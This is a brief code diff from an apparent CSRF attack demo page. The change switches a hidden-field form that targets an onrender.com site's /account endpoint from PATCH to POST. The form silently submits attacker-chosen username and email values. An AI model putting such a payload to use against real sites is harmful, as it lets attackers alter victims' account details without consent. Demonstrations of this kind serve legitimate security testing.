@@ -21,7 +21,7 @@ async def read_root():
     </head>
     <body>
         <h1>CSRF Attack Demo</h1>
-        <form action="https://sktst-rental.onrender.com/account" method="PATCH">
+        <form action="https://sktst-rental.onrender.com/account" method="POST">
             <input type="hidden" name="Username" value="attacker">
             <input type="hidden" name="Email" value="attacker@example.com">
             <input type="submit" value="Submit">
